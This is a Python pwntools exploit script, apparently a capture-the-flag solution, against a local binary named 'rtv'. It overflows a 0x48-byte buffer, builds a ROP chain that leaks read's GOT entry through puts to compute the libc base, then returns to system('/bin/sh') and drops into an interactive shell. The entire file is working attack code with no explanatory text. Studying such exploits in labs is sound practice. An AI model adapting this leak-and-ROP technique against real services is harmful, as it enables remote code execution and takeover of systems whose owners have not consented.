from pwn import *

def slog(name, addr):
        return success(": ".join([name, hex(addr)]))


p = process("./rtv")
e = ELF("./rtv")
libc = e.libc
r = ROP(e)

context.log_level = 'debug'

puts_plt = e.plt['puts']
read_got = e.got['read']

read_offset = libc.symbols['read']
system_offset = libc.symbols['system']
binsh_offset = list(libc.search(b"/bin/sh"))[0]

vuln = e.symbols['vuln']
ret = r.find_gadget(['ret'])[0]
pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]

payload = b'A' * 0x48


# puts(read@got)
payload += p64(pop_rdi) + p64(read_got)
payload += p64(puts_plt)


# return to vuln
payload += p64(vuln)


p.sendlineafter("Input: ", payload)

read = u64(p.recvn(6)+b'\x00'*2)
lb = read - read_offset
system = lb + system_offset
binsh = lb + binsh_offset

slog("read", read)
slog("libc base", lb)
slog("system", system)
slog("/bin/sh", binsh)

sleep(1)

payload = b'A' * 0x48

# system("/bin/sh")
payload += p64(ret)
payload += p64(pop_rdi) + p64(binsh)
payload += p64(system)

p.sendlineafter("Input: ", payload)

p.interactive()

